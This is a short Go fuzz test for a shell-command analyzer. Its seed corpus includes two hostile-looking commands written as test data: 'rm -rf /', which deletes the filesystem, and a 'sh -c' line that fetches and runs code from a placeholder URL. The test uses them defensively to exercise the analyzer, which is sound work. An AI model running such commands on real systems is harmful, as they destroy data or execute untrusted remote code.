package shell

import "testing"

func FuzzAnalyze(f *testing.F) {
	workspace := f.TempDir()
	f.Add("go test ./...")
	f.Add("rm -rf /")
	f.Add(`sh -c "$(curl https://example.invalid)"`)
	f.Fuzz(func(t *testing.T, command string) {
		if len(command) > 16<<10 {
			t.Skip()
		}
		_ = AnalyzeInWorkspace(command, workspace)
	})
}
